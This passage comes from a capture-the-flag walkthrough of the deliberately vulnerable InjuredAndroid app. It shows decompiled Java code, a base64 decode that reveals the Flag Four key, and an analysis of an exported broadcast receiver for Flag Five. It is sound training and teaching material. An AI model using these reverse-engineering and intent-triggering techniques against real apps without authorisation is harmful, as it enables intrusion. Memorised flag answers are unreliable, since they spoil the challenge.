class=\"language-plaintext highlighter-rouge\">f2418a</code> but really nothing else useful to us.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">package</span> <span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">w</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">java.nio.charset.Charset</span><span class=\"p\">;</span><span class=\"o\">/*</span> <span class=\"n\">loaded</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">classes</span><span class=\"p\">.</span><span class=\"n\">dex</span> <span class=\"o\">*/</span><span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"k\">class</span> <span class=\"nc\">c</span> <span class=\"p\">{</span>    <span class=\"o\">/*</span> <span class=\"n\">renamed</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">a</span>  <span class=\"n\">reason</span><span class=\"p\">:</span> <span class=\"n\">collision</span> <span class=\"k\">with</span> <span class=\"n\">root</span> <span class=\"n\">package</span> <span class=\"n\">name</span> <span class=\"o\">*/</span>    <span class=\"n\">public</span> <span class=\"n\">static</span> <span class=\"n\">final</span> <span class=\"n\">Charset</span> <span class=\"n\">f2418a</span><span class=\"p\">;</span>    <span class=\"n\">static</span> <span class=\"p\">{</span>        <span class=\"n\">Charset</span> <span class=\"n\">forName</span> <span class=\"o\">=</span> <span class=\"n\">Charset</span><span class=\"p\">.</span><span class=\"nf\">forName</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">UTF-8</span><span class=\"sh\">\"</span><span class=\"p\">);</span>        <span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">s</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"n\">forName</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">Charset.forName(</span><span class=\"se\">\\\"</span><span class=\"s\">UTF-8</span><span class=\"se\">\\\"</span><span class=\"s\">)</span><span class=\"sh\">\"</span><span class=\"p\">);</span>        <span class=\"n\">f2418a</span> <span class=\"o\">=</span> <span class=\"n\">forName</span><span class=\"p\">;</span>        <span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">s</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"n\">Charset</span><span class=\"p\">.</span><span class=\"nf\">forName</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">UTF-16</span><span class=\"sh\">\"</span><span class=\"p\">),</span> <span class=\"sh\">\"</span><span class=\"s\">Charset.forName(</span><span class=\"se\">\\\"</span><span class=\"s\">UTF-16</span><span class=\"se\">\\\"</span><span class=\"s\">)</span><span class=\"sh\">\"</span><span class=\"p\">);</span>        <span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">s</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"n\">Charset</span><span class=\"p\">.</span><span class=\"nf\">forName</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">UTF-16BE</span><span class=\"sh\">\"</span><span class=\"p\">),</span> <span class=\"sh\">\"</span><span class=\"s\">Charset.forName(</span><span class=\"se\">\\\"</span><span class=\"s\">UTF-16BE</span><span class=\"se\">\\\"</span><span class=\"s\">)</span><span class=\"sh\">\"</span><span class=\"p\">);</span>        <span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">s</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"n\">Charset</span><span class=\"p\">.</span><span class=\"nf\">forName</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">UTF-16LE</span><span class=\"sh\">\"</span><span class=\"p\">),</span> <span class=\"sh\">\"</span><span class=\"s\">Charset.forName(</span><span class=\"se\">\\\"</span><span class=\"s\">UTF-16LE</span><span class=\"se\">\\\"</span><span class=\"s\">)</span><span class=\"sh\">\"</span><span class=\"p\">);</span>        <span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">s</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"n\">Charset</span><span class=\"p\">.</span><span class=\"nf\">forName</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">US-ASCII</span><span class=\"sh\">\"</span><span class=\"p\">),</span> <span class=\"sh\">\"</span><span class=\"s\">Charset.forName(</span><span class=\"se\">\\\"</span><span class=\"s\">US-ASCII</span><span class=\"se\">\\\"</span><span class=\"s\">)</span><span class=\"sh\">\"</span><span class=\"p\">);</span>        <span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">s</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"n\">Charset</span><span class=\"p\">.</span><span class=\"nf\">forName</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">ISO-8859-1</span><span class=\"sh\">\"</span><span class=\"p\">),</span> <span class=\"sh\">\"</span><span class=\"s\">Charset.forName(</span><span class=\"se\">\\\"</span><span class=\"s\">ISO-8859-1</span><span class=\"se\">\\\"</span><span class=\"s\">)</span><span class=\"sh\">\"</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Since that was a bust let’s look into <code class=\"language-plaintext highlighter-rouge\">a2</code>. From <code class=\"language-plaintext highlighter-rouge\">g()</code> in the <code class=\"language-plaintext highlighter-rouge\">b3nac.injuredandroid</code> folder we find <code class=\"language-plaintext highlighter-rouge\">f1468a</code>. Which turns out to simply be base64 decoding <code class=\"language-plaintext highlighter-rouge\">NF9vdmVyZG9uZV9vbWVsZXRz</code>.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">package</span> <span class=\"n\">b3nac</span><span class=\"p\">.</span><span class=\"n\">injuredandroid</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.util.Base64</span><span class=\"p\">;</span><span class=\"o\">/*</span> <span class=\"n\">loaded</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">classes</span><span class=\"p\">.</span><span class=\"n\">dex</span> <span class=\"o\">*/</span><span class=\"n\">public</span> <span class=\"k\">class</span> <span class=\"nc\">g</span> <span class=\"p\">{</span>    <span class=\"o\">/*</span> <span class=\"n\">renamed</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">a</span>  <span class=\"n\">reason</span><span class=\"p\">:</span> <span class=\"n\">collision</span> <span class=\"k\">with</span> <span class=\"n\">root</span> <span class=\"n\">package</span> <span class=\"n\">name</span> <span class=\"o\">*/</span>    <span class=\"n\">private</span> <span class=\"n\">byte</span><span class=\"p\">[]</span> <span class=\"n\">f1468a</span> <span class=\"o\">=</span> <span class=\"n\">Base64</span><span class=\"p\">.</span><span class=\"nf\">decode</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">NF9vdmVyZG9uZV9vbWVsZXRz</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>    <span class=\"n\">public</span> <span class=\"n\">byte</span><span class=\"p\">[]</span> <span class=\"nf\">a</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">this</span><span class=\"p\">.</span><span class=\"n\">f1468a</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Decoding the string will give us our key to trigger the flag.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">echo</span> <span class=\"sh\">'</span><span class=\"s\">NF9vdmVyZG9uZV9vbWVsZXRz</span><span class=\"sh\">'</span> <span class=\"o\">|</span> <span class=\"n\">base64</span> <span class=\"o\">--</span><span class=\"n\">decode</span><span class=\"mi\">4</span><span class=\"n\">_overdone_omelets</span></code></pre></div></div><h1 id=\"flag-five-exported-broadcast-receiver\">Flag Five: Exported Broadcast Receiver</h1><p>From the de-compiled code for <code class=\"language-plaintext highlighter-rouge\">FlagFiveActivity</code> we can see that an intent <code class=\"language-plaintext highlighter-rouge\">com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT</code> is being created along with a listener. Additionally the receiver is created using <code class=\"language-plaintext highlighter-rouge\">ComponentName(this, FlagFiveReceiver.class)</code>.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">package</span> <span class=\"n\">b3nac</span><span class=\"p\">.</span><span class=\"n\">injuredandroid</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.content.ComponentName</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.content.Intent</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.content.IntentFilter</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.os.Bundle</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.view.View</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.widget.Button</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">androidx.appcompat.widget.Toolbar</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">com.google.android.material.floatingactionbutton.FloatingActionButton</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">com.google.android.material.snackbar.Snackbar</span><span class=\"p\">;</span><span class=\"o\">/*</span> <span class=\"n\">loaded</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">classes</span><span class=\"p\">.</span><span class=\"n\">dex</span> <span class=\"o\">*/</span><span class=\"n\">public</span> <span class=\"k\">class</span> <span class=\"nc\">FlagFiveActivity</span> <span class=\"n\">extends</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">appcompat</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">c</span> <span class=\"p\">{</span>    <span class=\"nb\">int</span> <span class=\"n\">w</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>    <span class=\"n\">private</span> <span class=\"n\">FlagFiveReceiver</span> <span class=\"n\">x</span> <span class=\"o\">=</span> <span class=\"n\">new</span> <span class=\"nc\">FlagFiveReceiver</span><span class=\"p\">();</span>    <span class=\"n\">public</span> <span class=\"n\">void</span> <span class=\"nc\">F</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nf\">sendBroadcast</span><span class=\"p\">(</span><span class=\"n\">new</span> <span class=\"nc\">Intent</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT</span><span class=\"sh\">\"</span><span class=\"p\">));</span>    <span class=\"p\">}</span>    <span class=\"n\">public</span> <span class=\"o\">/*</span> <span class=\"n\">synthetic</span> <span class=\"o\">*/</span> <span class=\"n\">void</span> <span class=\"nc\">G</span><span class=\"p\">(</span><span class=\"n\">View</span> <span class=\"n\">view</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">this</span><span class=\"p\">.</span><span class=\"n\">w</span><span class=\"p\">;</span>        <span class=\"nf\">if </span><span class=\"p\">(</span><span class=\"n\">i</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"n\">Snackbar</span> <span class=\"n\">X</span> <span class=\"o\">=</span> <span class=\"n\">Snackbar</span><span class=\"p\">.</span><span class=\"nc\">X</span><span class=\"p\">(</span><span class=\"n\">view</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">Where is bob.</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>            <span class=\"n\">X</span><span class=\"p\">.</span><span class=\"nc\">Y</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">Action</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">null</span><span class=\"p\">);</span>            <span class=\"n\">X</span><span class=\"p\">.</span><span class=\"nc\">N</span><span class=\"p\">();</span>            <span class=\"n\">this</span><span class=\"p\">.</span><span class=\"n\">w</span><span class=\"o\">++</span><span class=\"p\">;</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"nf\">if </span><span class=\"p\">(</span><span class=\"n\">i</span> <span class=\"o\">==</span> <span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"n\">Snackbar</span> <span class=\"n\">X2</span> <span class=\"o\">=</span> <span class=\"n\">Snackbar</span><span class=\"p\">.</span><span class=\"nc\">X</span><span class=\"p\">(</span><span class=\"n\">view</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">Classes and imports.</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>            <span class=\"n\">X2</span><span class=\"p\">.</span><span class=\"nc\">Y</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">Action</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">null</span><span class=\"p\">);</span>            <span class=\"n\">X2</span><span class=\"p\">.</span><span class=\"nc\">N</span><span class=\"p\">();</span>            <span class=\"n\">this</span><span class=\"p\">.</span><span class=\"n\">w</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"n\">public</span> <span class=\"o\">/*</span> <span class=\"n\">synthetic</span> <span class=\"o\">*/</span> <span class=\"n\">void</span> <span class=\"nc\">H</span><span class=\"p\">(</span><span class=\"n\">View</span> <span class=\"n\">view</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nc\">F</span><span class=\"p\">();</span>    <span class=\"p\">}</span>    <span class=\"o\">/*</span> <span class=\"n\">JADX</span> <span class=\"n\">INFO</span><span class=\"p\">:</span> <span class=\"n\">Access</span> <span class=\"n\">modifiers</span> <span class=\"n\">changed</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">protected</span> <span class=\"o\">*/</span>    <span class=\"nd\">@Override</span> <span class=\"o\">//</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">appcompat</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">c</span><span class=\"p\">,</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">fragment</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">,</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">activity</span><span class=\"p\">.</span><span class=\"n\">ComponentActivity</span><span class=\"p\">,</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">core</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">e</span><span class=\"p\">,</span> <span class=\"n\">android</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">Activity</span>    <span class=\"n\">public</span> <span class=\"n\">void</span> <span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"n\">Bundle</span> <span class=\"n\">bundle</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">super</span><span class=\"p\">.</span><span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"n\">bundle</span><span class=\"p\">);</span>        <span class=\"nf\">setContentView</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"n\">layout</span><span class=\"p\">.</span><span class=\"n\">activity_flag_five</span><span class=\"p\">);</span>        <span class=\"nc\">C</span><span class=\"p\">((</span><span class=\"n\">Toolbar</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"nb\">id</span><span class=\"p\">.</span><span class=\"n\">toolbar</span><span class=\"p\">));</span>        <span class=\"p\">((</span><span class=\"n\">FloatingActionButton</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"nb\">id</span><span class=\"p\">.</span><span class=\"n\">fab</span><span class=\"p\">)).</span><span class=\"nf\">setOnClickListener</span><span class=\"p\">(</span><span class=\"n\">new</span> <span class=\"n\">View</span><span class=\"p\">.</span><span class=\"nc\">OnClickListener</span><span class=\"p\">()</span> <span class=\"p\">{</span> <span class=\"o\">//</span> <span class=\"k\">from</span> <span class=\"n\">class</span><span class=\"p\">:</span> <span class=\"n\">b3nac</span><span class=\"p\">.</span><span class=\"n\">injuredandroid</span><span class=\"p\">.</span><span class=\"n\">c</span>            <span class=\"nd\">@Override</span> <span class=\"o\">//</span> <span class=\"n\">android</span><span class=\"p\">.</span><span class=\"n\">view</span><span class=\"p\">.</span><span class=\"n\">View</span><span class=\"p\">.</span><span class=\"n\">OnClickListener</span>            <span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"n\">void</span> <span class=\"nf\">onClick</span><span class=\"p\">(</span><span class=\"n\">View</span> <span class=\"n\">view</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"n\">FlagFiveActivity</span><span class=\"p\">.</span><span class=\"n\">this</span><span class=\"p\">.</span><span class=\"nc\">G</span><span class=\"p\">(</span><span class=\"n\">view</span><span class=\"p\">);</span>            <span class=\"p\">}</span>        <span class=\"p\">});</span>        <span class=\"n\">Button</span> <span class=\"n\">button</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"n\">Button</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"nb\">id</span><span class=\"p\">.</span><span class=\"n\">button9</span><span class=\"p\">);</span>        <span class=\"n\">new</span> <span class=\"nc\">ComponentName</span><span class=\"p\">(</span><span class=\"n\">this</span><span class=\"p\">,</span> <span class=\"n\">FlagFiveReceiver</span><span class=\"p\">.</span><span class=\"n\">class</span><span class=\"p\">);</span>        <span class=\"nf\">getPackageManager</span><span class=\"p\">();</span>        <span class=\"n\">a</span><span class=\"p\">.</span><span class=\"n\">m</span><span class=\"p\">.</span><span class=\"n\">a</span><span class=\"p\">.</span><span class=\"n\">a</span><span class=\"p\">.</span><span class=\"nf\">b</span><span class=\"p\">(</span><span class=\"n\">this</span><span class=\"p\">).</span><span class=\"nf\">c</span><span class=\"p\">(</span><span class=\"n\">this</span><span class=\"p\">.</span><span class=\"n\">x</span><span class=\"p\">,</span> <span class=\"n\">new</span> <span class=\"nc\">IntentFilter</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT</span><span class=\"sh\">\"</span><span class=\"p\">));</span>        <span class=\"n\">button</span><span class=\"p\">.</span><span class=\"nf\">setOnClickListener</span><span class=\"p\">(</span><span class=\"n\">new</span> <span class=\"n\">View</span><span class=\"p\">.</span><span class=\"nc\">OnClickListener</span><span class=\"p\">()</span> <span class=\"p\">{</span> <span class=\"o\">//</span> <span class=\"k\">from</span> <span class=\"n\">class</span><span class=\"p\">:</span> <span class=\"n\">b3nac</span><span class=\"p\">.</span><span class=\"n\">injuredandroid</span><span class=\"p\">.</span><span class=\"n\">b</span>            <span class=\"nd\">@Override</span> <span class=\"o\">//</span> <span class=\"n\">android</span><span class=\"p\">.</span><span class=\"n\">view</span><span class=\"p\">.</span><span class=\"n\">View</span><span class=\"p\">.</span><span class=\"n\">OnClickListener</span>            <span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"n\">void</span> <span class=\"nf\">onClick</span><span class=\"p\">(</span><span class=\"n\">View</span> <span class=\"n\">view</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"n\">FlagFiveActivity</span><span class=\"p\">.</span><span class=\"n\">this</span><span class=\"p\">.</span><span class=\"nc\">H</span><span class=\"p\">(</span><span class=\"n\">view</span><span class=\"p\">);</span>            <span class=\"p\">}</span>        <span class=\"p\">});</span>    <span class=\"p\">}</span>    <span class=\"o\">/*</span> <span class=\"n\">JADX</span> <span class=\"n\">INFO</span><span class=\"p\">:</span> <span class=\"n\">Access</span> <span class=\"n\">modifiers</span> <span class=\"n\">changed</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">protected</span> <span class=\"o\">*/</span>    <span class=\"nd\">@Override</span> <span class=\"o\">//</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">appcompat</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">c</span><span class=\"p\">,</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">fragment</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">,</span> <span class=\"n\">android</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">Activity</span>    <span class=\"n\">public</span> <span class=\"n\">void</span> <span class=\"nf\">onDestroy</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">a</span><span class=\"p\">.</span><span class=\"n\">m</span><span class=\"p\">.</span><span class=\"n\">a</span><span class=\"p\">.</span><span class=\"n\">a</span><span class=\"p\">.</span><span class=\"nf\">b</span><span class=\"p\">(</span><span class=\"n\">this</span><span class=\"p\">).</span><span class=\"nf\">e</span><span class=\"p\">(</span><span class=\"n\">this</span><span class=\"p\">.</span><span class=\"n\">x</span><span class=\"p\">);</span>        <span class=\"nb\">super</span><span class=\"p\">.</span><span class=\"nf\">onDestroy</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>In <code class=\"language-plaintext highlighter-rouge\">FlagFiveReceiver</code> we can see that if <code class=\"language-plaintext highlighter-rouge\">i2</code> is not 0 we will go into the else portion. Once there we can see that if <code class=\"language-plaintext highlighter-rouge\">i2</code> is equal to 2 then we will trigger the flag. <code class=\"language-plaintext highlighter-rouge\">i2</code> is equal to <code class=\"language-plaintext highlighter-rouge\">f1454a</code> which is equal to <code class=\"language-plaintext highlighter-rouge\">i</code> which presumably starts at zero but is increased by 1 each time the Broadcast Receiver receives the intent.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kr\">package</span> <span class=\"nx\">b3nac</span><span class=\"p\">.</span><span class=\"nx\">injuredandroid</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">content</span><span class=\"p\">.</span><span class=\"nx\">BroadcastReceiver</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">content</span><span class=\"p\">.</span><span class=\"nx\">Context</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">content</span><span class=\"p\">.</span><span class=\"nx\">Intent</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">util</span><span class=\"p\">.</span><span class=\"nx\">Log</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">widget</span><span class=\"p\">.</span><span class=\"nx\">Toast</span><span class=\"p\">;</span><span class=\"cm\">/* loaded from: classes.dex */</span><span class=\"kr\">public</span> <span class=\"nx\">final</span> <span class=\"kd\">class</span> <span class=\"nc\">FlagFiveReceiver</span> <span class=\"kd\">extends</span> <span class=\"nc\">BroadcastReceiver</span> <span class=\"p\">{</span>    <span class=\"cm\">/* renamed from: a  reason: collision with root package name */</span>    <span class=\"kr\">private</span> <span class=\"kd\">static</span> <span class=\"nx\">int</span> <span class=\"nx\">f1454a</span><span class=\"p\">;</span>    <span class=\"p\">@</span><span class=\"nd\">Override</span> <span class=\"c1\">// android.content.BroadcastReceiver</span>    <span class=\"kr\">public</span> <span class=\"k\">void</span> <span class=\"nf\">onReceive</span><span class=\"p\">(</span><span class=\"nx\">Context</span> <span class=\"nx\">context</span><span class=\"p\">,</span> <span class=\"nx\">Intent</span> <span class=\"nx\">intent</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">String</span> <span class=\"nx\">str</span><span class=\"p\">;</span>        <span class=\"nx\">int</span> <span class=\"nx\">i</span><span class=\"p\">;</span>        <span class=\"nb\">String</span> <span class=\"nx\">e</span><span class=\"p\">;</span>        <span class=\"nb\">String</span> <span class=\"nx\">e2</span><span class=\"p\">;</span>        <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">e</span><span class=\"p\">(</span><span class=\"nx\">context</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">context</span><span class=\"dl\">\"</span><span class=\"p\">);</span>        <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">e</span><span class=\"p\">(</span><span class=\"nx\">intent</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">intent</span><span class=\"dl\">\"</span><span class=\"p\">);</span>        <span class=\"nx\">j</span><span class=\"p\">.</span><span class=\"nx\">j</span><span class=\"p\">.</span><span class=\"nf\">a</span><span class=\"p\">(</span><span class=\"nx\">context</span><span class=\"p\">);</span>        <span class=\"nx\">int</span> <span class=\"nx\">i2</span> <span class=\"o\">=</span> <span class=\"nx\">f1454a</span><span class=\"p\">;</span>        <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">i2</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nx\">StringBuilder</span> <span class=\"nx\">sb</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">StringBuilder</span><span class=\"p\">();</span>            <span class=\"nx\">e</span> <span class=\"o\">=</span> <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">w</span><span class=\"p\">.</span><span class=\"nx\">h</span><span class=\"p\">.</span><span class=\"nf\">e</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"se\">\\n</span><span class=\"s2\">    Action: </span><span class=\"dl\">\"</span> <span class=\"o\">+</span> <span class=\"nx\">intent</span><span class=\"p\">.</span><span class=\"nf\">getAction</span><span class=\"p\">()</span> <span class=\"o\">+</span> <span class=\"dl\">\"</span><span class=\"se\">\\n\\n</span><span class=\"s2\">    </span><span class=\"dl\">\"</span><span class=\"p\">);</span>            <span class=\"nx\">sb</span><span class=\"p\">.</span><span class=\"nf\">append</span><span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">);</span>            <span class=\"nx\">e2</span> <span class=\"o\">=</span> <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">w</span><span class=\"p\">.</span><span class=\"nx\">h</span><span class=\"p\">.</span><span class=\"nf\">e</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"se\">\\n</span><span class=\"s2\">    URI: </span><span class=\"dl\">\"</span> <span class=\"o\">+</span> <span class=\"nx\">intent</span><span class=\"p\">.</span><span class=\"nf\">toUri</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"dl\">\"</span><span class=\"se\">\\n\\n</span><span class=\"s2\">    </span><span class=\"dl\">\"</span><span class=\"p\">);</span>            <span class=\"nx\">sb</span><span class=\"p\">.</span><span class=\"nf\">append</span><span class=\"p\">(</span><span class=\"nx\">e2</span><span class=\"p\">);</span>            <span class=\"nx\">str</span> <span class=\"o\">=</span> <span class=\"nx\">sb</span><span class=\"p\">.</span><span class=\"nf\">toString</span><span class=\"p\">();</span>            <span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">s</span><span class=\"p\">.</span><span class=\"nx\">d</span><span class=\"p\">.</span><span class=\"nx\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"nx\">str</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">sb.toString()</span><span class=\"dl\">\"</span><span class=\"p\">);</span>            <span class=\"nx\">Log</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">DUDE!:</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"nx\">str</span><span class=\"p\">);</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>            <span class=\"nx\">str</span> <span class=\"o\">=</span> <span class=\"dl\">\"</span><span class=\"s2\">Keep trying!</span><span class=\"dl\">\"</span><span class=\"p\">;</span>            <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">i2</span> <span class=\"o\">!=</span> <span 